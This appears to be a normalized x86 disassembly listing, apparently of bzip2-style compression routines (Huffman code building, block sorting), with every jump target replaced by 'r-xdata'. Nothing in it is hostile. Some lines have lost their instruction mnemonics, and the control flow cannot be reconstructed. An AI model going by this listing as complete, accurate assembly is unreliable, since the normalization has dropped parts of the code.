movzx ecx al
and cl 0x1
shl cl 0x2
shr edx cl
mov ecx [ ebx + 0xc50 ]
movzx eax [ ecx + eax * 2 ]
and edx 0xf
shl edx 0x10
or edx eax
inc [ ebx + 0x440 ]
mov [ ebx + 0x38 ] edx
lea ecx [ ebx + 0x444 ]
push ecx
push eax
call sub_100072fb
mov edx [ ebx + 0x38 ]
mov esi [ ebx + 0xc54 ]
pop ecx
pop ecx
mov ecx edx
shr ecx 0x1
mov [ ebx + 0x3c ] eax
movzx esi [ ecx + esi ]
movzx ecx dl
and cl 0x1
shl cl 0x2
shr esi cl
mov ecx [ ebx + 0xc50 ]
movzx ecx [ ecx + edx * 2 ]
and esi 0xf
shl esi 0x10
or esi ecx
inc [ ebx + 0x440 ]
cmp [ ebx + 0x14 ] 0x0
mov [ ebx + 0x38 ] esi
jne r-xdata
dec [ ebx + 0x14 ]
mov esi [ ebx + 0x14 ]
xor ecx ecx
cmp esi 0x1
sete cl
xor ecx eax
jmp r-xdata
mov ecx [ ebx + 0x18 ]
mov edx [ ecx * 4 + rw-data ]
inc ecx
mov [ ebx + 0x14 ] edx
mov [ ebx + 0x18 ] ecx
cmp ecx 0x200
jne r-xdata
mov [ ebx + 0x3c ] ecx
jmp r-xdata
and [ ebx + 0x18 ] 0x0
sub_1000b4fb
push ebp
mov ebp esp
mov eax 0x1440
call sub_10010a80
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
test edi edi
jle r-xdata
xor eax eax
xor edx edx
inc eax
cmp edi eax
mov ebx edi
mov [ ebp - 0x420 ] edx
mov [ ebp - 0xc30 ] edx
mov [ ebp - 0x1440 ] 0xfffffffe
mov [ ebp - 0x4 ] eax
jl r-xdata
mov ecx [ ebp + 0xc ]
lea edx [ ebp - 0xc2c ]
sub edx ecx
mov esi edi
mov edi [ ebp + 0x10 ]
xor edx edx
inc edx
xor bl bl
cmp edi edx
jl r-xdata
mov ecx edi
or eax 0xffffffff
lea edi [ ebp - 0x143c ]
[ edi ]
shl eax 0x8
mov [ edx + ecx ] eax
add ecx 0x4
dec esi
jne r-xdata
inc eax
pop edi
pop esi
pop ebx
leave
retn
lea esi [ ebp - 0x143c ]
mov ecx [ ebp - 0xc ]
mov esi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] esi
mov esi [ ecx ]
mov ecx edx
mov eax [ ecx ]
test eax eax
jne r-xdata
cmp ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx - 0x1 ] cl
jle r-xdata
mov eax esi
mov ecx [ ebp - 0x4 ]
inc edx
lea eax [ ebp + edx * 4 - 0x420 ]
mov [ eax ] ecx
mov eax ecx
mov ecx edx
sar ecx 0x1
mov edi [ ebp + ecx * 4 - 0x420 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp + eax * 4 - 0xc30 ]
mov esi [ ecx ]
cmp esi [ ebp + edi * 4 - 0xc30 ]
mov [ ebp - 0xc ] edx
jge r-xdata
jmp r-xdata
mov [ ebp + ecx * 4 - 0x420 ] edi
mov ecx [ ebp - 0x8 ]
mov edi ecx
sar edi 0x1
mov [ ebp - 0x8 ] edi
mov edi [ ebp + edi * 4 - 0x420 ]
cmp esi [ ebp + edi * 4 - 0xc30 ]
jl r-xdata
jmp r-xdata
inc edx
add esi 0x4
cmp edx edi
jle r-xdata
mov bl 0x1
mov eax [ eax ]
lea eax [ ebp + eax * 4 - 0x1440 ]
inc ecx
cmp [ eax ] 0x0
jge r-xdata
cmp edx 0x1
jg r-xdata
inc [ ebp - 0x4 ]
mov [ ebp + ecx * 4 - 0x420 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x10 ]
jle r-xdata
xor ecx ecx
cmp [ esi ] ecx
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp - 0x41c ]
mov ecx [ ebp + edx * 4 - 0x420 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push 0x2
dec edx
pop esi
inc eax
cmp esi edx
mov [ ebp - 0x41c ] ecx
mov [ ebp - 0x8 ] ecx
jg r-xdata
xor esi esi
inc esi
mov ecx [ ebp - 0x8 ]
mov [ ebp + eax * 4 - 0x420 ] ecx
mov esi [ ebp + edx * 4 - 0x420 ]
mov ecx [ ebp - 0x41c ]
xor eax eax
dec edx
inc eax
cmp edx 0x2
mov [ ebp - 0x41c ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x2
jl r-xdata
mov ecx [ ebp + ecx * 4 - 0xc30 ]
mov [ ebp - 0xc ] ecx
lea ecx [ ebp + esi * 4 - 0xc30 ]
mov eax [ ecx ]
sar eax 0x8
cdq
sub eax edx
sar eax 0x1
inc eax
shl eax 0x8
inc esi
cmp esi edi
mov [ ecx ] eax
jle r-xdata
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov [ ebp + eax * 4 - 0x420 ] esi
mov esi [ ebp - 0x10 ]
mov eax ecx
shl eax 0x2
mov ecx [ ebp + eax - 0xc30 ]
shl esi 0x2
inc ebx
mov [ ebp + eax - 0x1440 ] ebx
mov eax [ ebp + esi - 0xc30 ]
mov edi 0xff
mov [ ebp + esi - 0x1440 ] ebx
mov [ ebp - 0x4 ] ecx
and [ ebp - 0x4 ] edi
mov esi eax
and esi edi
mov edi [ ebp - 0x4 ]
cmp esi edi
jle r-xdata
mov esi [ ebp + esi * 4 - 0xc30 ]
cmp [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] esi
mov ecx [ ebp + esi * 4 - 0x420 ]
mov edi [ ebp - 0xc ]
cmp edi [ ebp + ecx * 4 - 0xc30 ]
jl r-xdata
mov ecx [ ebp + esi * 4 - 0x41c ]
mov edi [ ebp + esi * 4 - 0x420 ]
mov ecx [ ebp + ecx * 4 - 0xc30 ]
cmp ecx [ ebp + edi * 4 - 0xc30 ]
jge r-xdata
or [ ebp + ebx * 4 - 0x1440 ] 0xffffffff
mov esi 0xffffff00
and eax esi
and ecx esi
add eax ecx
inc edi
or eax edi
inc edx
mov [ ebp + ebx * 4 - 0xc30 ] eax
lea eax [ ebp + edx * 4 - 0x420 ]
mov ecx edx
sar ecx 0x1
mov [ eax ] ebx
mov esi [ ebp + ecx * 4 - 0x420 ]
mov eax ebx
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp + eax * 4 - 0xc30 ]
mov edi [ ecx ]
cmp edi [ ebp + esi * 4 - 0xc30 ]
mov [ ebp - 0x4 ] edx
jge r-xdata
mov edi esi
mov esi [ ebp - 0x4 ]
mov esi [ ebp + esi * 4 - 0x420 ]
mov edi [ ebp - 0xc ]
cmp edi [ ebp + esi * 4 - 0xc30 ]
jl r-xdata
mov esi [ ebp - 0x4 ]
shl esi 0x2
mov edi [ ebp + esi - 0x41c ]
mov esi [ ebp + esi - 0x420 ]
mov edi [ ebp + edi * 4 - 0xc30 ]
cmp edi [ ebp + esi * 4 - 0xc30 ]
jge r-xdata
mov [ ebp + eax * 4 - 0x420 ] ecx
mov eax esi
add esi esi
cmp esi edx
jle r-xdata
inc esi
mov ecx [ ebp - 0x4 ]
mov [ ebp + ecx * 4 - 0x420 ] eax
mov ecx [ ecx ]
mov edi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp + eax * 4 - 0x420 ] esi
mov eax [ ebp - 0x4 ]
shl [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x4 ] edx
jle r-xdata
inc [ ebp - 0x4 ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
sar edi 0x1
mov [ ebp + ecx * 4 - 0x420 ] esi
mov esi [ ebp + edi * 4 - 0x420 ]
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp + esi * 4 - 0xc30 ]
jl r-xdata
jge r-xdata
sub_1000b81e
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
xor ecx ecx
cmp edx [ ebp + 0x14 ]
jg r-xdata
pop ebp
retn
push esi
add ecx ecx
inc edx
cmp edx [ ebp + 0x14 ]
jle r-xdata
mov esi [ ebp + 0xc ]
movzx esi [ eax + esi ]
cmp esi edx
jne r-xdata
xor eax eax
cmp [ ebp + 0x18 ] eax
jle r-xdata
pop esi
inc eax
cmp eax [ ebp + 0x18 ]
jl r-xdata
mov esi [ ebp + 0x8 ]
mov [ esi + eax * 4 ] ecx
inc ecx
sub_1000b856
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x18 ]
xor ecx ecx
cmp esi [ ebp + 0x1c ]
push edi
mov edx esi
jg r-xdata
mov edx [ ebp + 0xc ]
push 0x17
xor eax eax
pop ecx
mov edi edx
[ edi ]
xor ecx ecx
cmp [ ebp + 0x20 ] ecx
jle r-xdata
xor eax eax
cmp [ ebp + 0x20 ] eax
jle r-xdata
xor ecx ecx
inc ecx
movzx eax [ ecx + ebx ]
lea eax [ edx + eax * 4 + 0x4 ]
inc [ eax ]
inc ecx
cmp ecx [ ebp + 0x20 ]
jl r-xdata
inc edx
cmp edx [ ebp + 0x1c ]
jle r-xdata
movzx edi [ eax + ebx ]
cmp edi edx
jne r-xdata
mov edi [ edx + ecx * 4 - 0x4 ]
lea eax [ edx + ecx * 4 ]
add [ eax ] edi
inc ecx
cmp ecx 0x17
jl r-xdata
mov edi [ ebp + 0x8 ]
push 0x17
xor eax eax
and [ ebp + 0x20 ] eax
pop ecx
[ edi ]
mov ecx [ ebp + 0x1c ]
cmp esi ecx
jg r-xdata
inc eax
cmp eax [ ebp + 0x20 ]
jl r-xdata
mov edi [ ebp + 0x10 ]
mov [ edi + ecx * 4 ] eax
inc ecx
lea eax [ esi + 0x1 ]
cmp eax [ ebp + 0x1c ]
jg r-xdata
mov edi [ ebp + 0x8 ]
sub edi edx
sub ecx esi
lea eax [ edx + esi * 4 ]
mov [ ebp - 0x4 ] edi
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0x8 ]
lea ecx [ ecx + eax * 4 - 0x4 ]
mov ebx [ ebp - 0x4 ]
lea esi [ eax + 0x4 ]
mov edi [ esi ]
sub edi [ eax ]
add [ ebp + 0x20 ] edi
mov edi [ ebp + 0x20 ]
shl [ ebp + 0x20 ] 0x1
dec edi
dec ecx
mov [ ebx + eax ] edi
mov eax esi
jne r-xdata
mov esi [ ebp + 0x18 ]
mov esi [ ecx ]
lea esi [ esi + esi + 0x2 ]
sub esi [ edx + eax * 4 ]
add ecx 0x4
mov [ edx + eax * 4 ] esi
inc eax
cmp eax [ ebp + 0x1c ]
jle r-xdata
sub_1000b92d
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
cmp [ ebp + 0x8 ] edx
je r-xdata
leave
retn
mov ecx edx
sub ecx [ ebp + 0x8 ]
push ebx
cmp ecx 0x3
push esi
jle r-xdata
mov edx [ ebp + 0xc ]
jmp r-xdata
add edx 0xfffffffc
jmp r-xdata
dec edx
cmp edx [ ebp + 0x8 ]
jge r-xdata
cmp edx [ ebp + 0x8 ]
jge r-xdata
mov ecx [ eax + edx * 4 ]
mov ebx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ edx + 0x1 ]
jmp r-xdata
pop esi
pop ebx
mov ecx [ eax + edx * 4 ]
mov ebx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ edx + 0x4 ]
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jle r-xdata
cmp ecx [ ebp + 0xc ]
jle r-xdata
mov esi [ eax + ecx * 4 ]
cmp ebx [ edi + esi * 4 ]
jbe r-xdata
mov esi [ ebp - 0x4 ]
mov [ eax + ecx * 4 - 0x4 ] esi
mov esi [ eax + ecx * 4 ]
cmp ebx [ edi + esi * 4 ]
jbe r-xdata
mov esi [ ebp - 0x4 ]
mov [ eax + ecx * 4 - 0x10 ] esi
dec edx
mov [ eax + ecx * 4 - 0x4 ] esi
inc ecx
mov [ eax + ecx * 4 - 0x10 ] esi
add ecx 0x4
sub_1000b9af
push ebp
mov ebp esp
sub esp 0x344
and [ ebp - 0x18 ] 0x0
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov [ ebp - 0x344 ] eax
mov [ ebp + 0xc ] 0x1
push edi
mov eax [ ebp - 0x18 ]
imul eax eax 0x1dc5
inc eax
and eax 0x7fff
push 0x3
xor edx edx
pop edi
mov [ ebp - 0x18 ] eax
div edi
test edx edx
jne r-xdata
mov edi [ ebp + 0x8 ]
push ebx
push ecx
mov eax esi
call sub_1000b92d
pop ecx
pop ecx
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov eax [ esi + ecx * 4 ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov eax [ esi + ebx * 4 ]
lea eax [ ebx + ecx ]
sar eax 0x1
mov eax [ esi + eax * 4 ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + eax * 4 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] ecx
mov edi ecx
mov [ ebp - 0x10 ] ebx
mov eax ebx
dec [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
shl eax 0x2
lea ecx [ ebp + eax - 0x1b4 ]
lea eax [ ebp + eax - 0x344 ]
mov ebx [ eax ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] ecx
mov ecx [ ecx ]
mov eax ebx
sub eax ecx
cmp eax 0xa
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ebx
jge r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
cmp [ ebp - 0x10 ] ecx
jl r-xdata
mov edx [ esi + edi * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
sub ecx [ ebp - 0x4 ]
jne r-xdata
mov ecx edi
sub ecx [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
cmp ecx edx
jge r-xdata
test ecx ecx
jle r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ esi + ecx * 4 ]
mov [ esi + edi * 4 ] ecx
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
inc edi
cmp edi eax
mov [ esi + ecx * 4 ] edx
jle r-xdata
mov [ ebp - 0x4 ] edx
test edx edx
jle r-xdata
mov edx ecx
inc edi
jmp r-xdata
cmp edi eax
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx ebx
sub edx [ ebp - 0x10 ]
sub ecx eax
cmp edx ecx
jge r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx edi
sub ebx edx
lea ecx [ esi + ecx * 4 ]
lea edx [ esi + ebx * 4 ]
mov ebx [ ebp - 0xc ]
jmp r-xdata
mov ebx [ ebp - 0xc ]
mov edx [ esi + eax * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
sub ecx [ ebp - 0x4 ]
jne r-xdata
mov [ ebp - 0x4 ] ecx
test ecx ecx
jle r-xdata
mov ecx edx
mov ebx [ ecx ]
mov [ ebp - 0x8 ] ebx
mov ebx [ edx ]
mov [ ecx ] ebx
mov ebx [ ebp - 0x8 ]
mov [ edx ] ebx
add ecx 0x4
add edx 0x4
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
mov ebx [ ebp - 0xc ]
cmp edi eax
jg r-xdata
test ecx ecx
jl r-xdata
mov ecx [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea ecx [ esi + ecx * 4 ]
mov ebx [ ecx ]
mov [ esi + eax * 4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
sub eax [ ebp - 0x10 ]
lea ecx [ ecx + edx - 0x1 ]
mov edi ecx
sub edi [ ebp - 0x14 ]
lea eax [ eax + ebx + 0x1 ]
mov edx ebx
sub edx eax
inc [ ebp + 0xc ]
cmp edi edx
jle r-xdata
lea edx [ esi + edi * 4 ]
mov edi ebx
sub edi ecx
lea ecx [ esi + edi * 4 + 0x4 ]
cmp edi eax
jg r-xdata
dec eax
cmp edi eax
jle r-xdata
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
shl eax 0x2
mov [ ebp + eax - 0x1b4 ] edx
mov [ ebp + eax - 0x344 ] ecx
mov edx [ ebp - 0x24 ]
mov [ edx ] ecx
mov ecx [ ebp + 0xc ]
shl ecx 0x2
mov [ ebp + ecx - 0x1b4 ] eax
mov [ ebp + ecx - 0x344 ] ebx
jmp r-xdata
mov edi [ edx ]
mov [ ebp - 0xc ] edi
mov edi [ ecx ]
mov [ edx ] edi
mov edi [ ebp - 0xc ]
mov [ ecx ] edi
add edx 0x4
add ecx 0x4
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
mov edx [ esi + eax * 4 ]
mov ecx [ esi + edi * 4 ]
mov [ esi + edi * 4 ] edx
mov [ esi + eax * 4 ] ecx
inc edi
dec eax
inc [ ebp + 0xc ]
sub_1000bbd6
push ebp
mov ebp esp
sub esp 0x810
push ebx
push esi
push edi
mov ebx eax
mov edx 0x101
xor eax eax
mov ecx edx
lea edi [ ebp - 0x410 ]
[ edi ]
mov eax [ ebp + 0x10 ]
xor esi esi
test eax eax
jle r-xdata
mov ecx 0x100
lea esi [ ebp - 0x410 ]
lea edi [ ebp - 0x810 ]
[ edi ] [ esi ]
xor esi esi
inc esi
mov ecx [ ebp + 0xc ]
movzx ecx [ esi + ecx ]
lea ecx [ ebp + ecx * 4 - 0x410 ]
inc [ ecx ]
inc esi
cmp esi eax
jl r-xdata
mov edi [ ebp + esi * 4 - 0x414 ]
lea ecx [ ebp + esi * 4 - 0x410 ]
add [ ecx ] edi
inc esi
cmp esi edx
jl r-xdata
xor edi edi
test eax eax
jle r-xdata
cdq
and edx 0x1f
add eax edx
sar eax 0x5
inc eax
inc eax
test eax eax
jle r-xdata
mov ecx [ ebp + 0xc ]
movzx ecx [ edi + ecx ]
lea edx [ ebp + ecx * 4 - 0x410 ]
mov ecx [ edx ]
dec ecx
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 ] edi
inc edi
cmp edi eax
jl r-xdata
xor edx edx
mov ecx eax
xor eax eax
mov edi ebx
[ edi ]
mov ecx [ ebp + edx * 4 - 0x410 ]
xor esi esi
mov eax ecx
and ecx 0x1f
inc esi
shl esi cl
sar eax 0x5
lea eax [ ebx + eax * 4 ]
or [ eax ] esi
inc edx
cmp edx 0x100
jl r-xdata
mov edx [ ebp + 0x10 ]
push 0x20
pop esi
xor edi edi
inc edi
mov ecx edx
and ecx 0x1f
shl edi cl
mov eax edx
sar eax 0x5
lea eax [ ebx + eax * 4 ]
or [ eax ] edi
lea ecx [ edx + 0x1 ]
xor edi edi
inc edi
mov eax ecx
and ecx 0x1f
shl edi cl
sar eax 0x5
lea eax [ ebx + eax * 4 ]
not edi
and [ eax ] edi
inc edx
inc edx
dec esi
jne r-xdata
mov [ ebp - 0x8 ] 0x1
and [ ebp - 0xc ] 0x0
or edi 0xffffffff
xor eax eax
mov ecx edx
and ecx 0x1f
inc eax
shl eax cl
mov ecx edx
sar ecx 0x5
test [ ebx + ecx * 4 ] eax
je r-xdata
xor esi esi
mov ecx eax
and ecx 0x1f
inc esi
shl esi cl
mov edx eax
sar edx 0x5
test [ ebx + edx * 4 ] esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + edx * 4 ]
sub eax [ ebp - 0x8 ]
jns r-xdata
mov esi edx
test ecx ecx
je r-xdata
mov ecx eax
sar ecx 0x5
mov edx [ ebx + ecx * 4 ]
push 0x1f
xor edi edi
mov ecx eax
pop esi
and ecx esi
inc edi
shl edi cl
test edx edi
je r-xdata
mov ecx [ ebp + 0xc ]
inc edx
cmp edx [ ebp + 0x10 ]
mov [ ecx + eax * 4 ] esi
jl r-xdata
add eax [ ebp + 0x10 ]
inc eax
lea ecx [ eax - 0x1 ]
cmp ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
jge r-xdata
cmp edx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax eax
cmp eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
jg r-xdata
mov ecx eax
and ecx esi
jmp r-xdata
xor edx edx
mov ecx eax
and ecx esi
inc edx
shl edx cl
mov ecx eax
sar ecx 0x5
test [ ebx + ecx * 4 ] edx
jne r-xdata
add eax 0x20
mov ecx eax
sar ecx 0x5
cmp [ ebx + ecx * 4 ] 0xffffffff
je r-xdata
xor esi esi
xor ecx ecx
xor edx edx
cmp [ ebp + 0x10 ] esi
jle r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor esi esi
inc esi
shl esi cl
mov edx eax
sar edx 0x5
test [ ebx + edx * 4 ] esi
je r-xdata
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x810 ]
xor edx edx
xor esi esi
cmp [ ebp + 0x10 ] edx
jle r-xdata
test ecx ecx
je r-xdata
mov ecx eax
sar ecx 0x5
mov edx [ ebx + ecx * 4 ]
xor esi esi
mov ecx eax
and ecx 0x1f
inc esi
shl esi cl
test edx esi
jne r-xdata
mov edi [ ebp + 0x8 ]
mov edi [ edi + edx * 4 ]
mov ebx [ ebp + 0xc ]
lea eax [ ebp + ecx * 4 - 0x810 ]
dec [ eax ]
inc edx
cmp edx [ ebp + 0x10 ]
mov [ ebx + edi ] cl
jl r-xdata
inc ecx
cmp [ ebp + ecx * 4 - 0x810 ] esi
je r-xdata
inc eax
mov ecx eax
and ecx 0x1f
lea edi [ eax - 0x1 ]
cmp edi [ ebp + 0x10 ]
jge r-xdata
test edx edx
jne r-xdata
cmp [ eax ] esi
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp edi eax
jle r-xdata
xor edx edx
mov ecx eax
and ecx 0x1f
inc edx
shl edx cl
mov ecx eax
sar ecx 0x5
test [ ebx + ecx * 4 ] edx
je r-xdata
add eax 0x20
mov ecx eax
sar ecx 0x5
cmp [ ebx + ecx * 4 ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov esi [ ebp + 0x8 ]
mov ecx edi
sub ecx eax
push edi
push [ ebp + 0xc ]
lea ecx [ edx + ecx + 0x1 ]
mov [ ebp - 0xc ] ecx
call sub_1000b9af
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
or eax 0xffffffff
jmp r-xdata
inc eax
jmp r-xdata
cmp edx edi
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
mov esi [ ebp + 0xc ]
mov ecx [ esi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
cmp eax ecx
je r-xdata
jmp r-xdata
inc edx
xor esi esi
mov ecx edx
and ecx 0x1f
inc esi
mov eax edx
sar eax 0x5
shl esi cl
lea eax [ ebx + eax * 4 ]
or [ eax ] esi
mov eax [ ebp - 0x4 ]
sub_1000bea7
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi edx
mov dl [ edi + eax ]
mov bl [ esi + eax ]
cmp bl dl
je r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
sbb eax eax
neg eax
jmp r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
mov edx [ ebp + 0xc ]
inc edi
inc esi
add edx 0x8
mov [ ebp + 0x8 ] edx
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
mov edx [ ebp + 0xc ]
inc edi
inc esi
cmp edi edx
jb r-xdata
cmp esi edx
jb r-xdata
sub edi edx
sub [ ebp + 0x8 ] 0x8
mov edx [ ebp + 0x10 ]
dec [ edx ]
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
sub esi edx
mov dl [ edi + eax ]
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
xor al al
sub_1000c08d
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
sub eax [ ebp + 0x14 ]
sub esp 0x1c
inc eax
cmp eax 0x2
jl r-xdata
leave
retn
xor ecx ecx
cmp [ rw-data ] eax
jge r-xdata
dec ecx
mov [ ebp - 0x18 ] ecx
js r-xdata
inc ecx
cmp [ ecx * 4 + rw-data ] eax
jl r-xdata
push ebx
push edi
dec ecx
mov [ ebp - 0x18 ] ecx
jns r-xdata
mov ecx edi
sub ecx eax
lea ebx [ esi + ecx * 4 ]
mov eax [ ecx * 4 + rw-data ]
mov edx [ ebp + 0x14 ]
lea edi [ eax + edx ]
cmp edi [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] edi
jg r-xdata
pop edi
pop ebx
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
inc edi
add ebx 0x4
cmp edi [ ebp + 0x18 ]
mov [ esi + ecx * 4 ] eax
jg r-xdata
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ esi + edi * 4 ]
mov ecx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea edx [ eax + ecx ]
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
add eax ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edx
call sub_1000bea7
add esp 0xc
test al al
je r-xdata
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + edx * 4 ] ecx
mov ecx [ ebp - 0x10 ]
sub [ ebp - 0x4 ] ecx
shl ecx 0x2
sub eax ecx
mov ecx [ ebp - 0x14 ]
dec ecx
cmp [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] eax
jle r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
inc edi
add ebx 0x4
cmp edi [ ebp + 0x18 ]
mov [ esi + ecx * 4 ] eax
jg r-xdata
mov eax ebx
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ eax ]
add eax [ ebp + 0x1c ]
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_1000bea7
add esp 0xc
test al al
jne r-xdata
mov eax [ esi + edi * 4 ]
mov ecx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea edx [ eax + ecx ]
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
add eax ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edx
call sub_1000bea7
add esp 0xc
test al al
je r-xdata
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
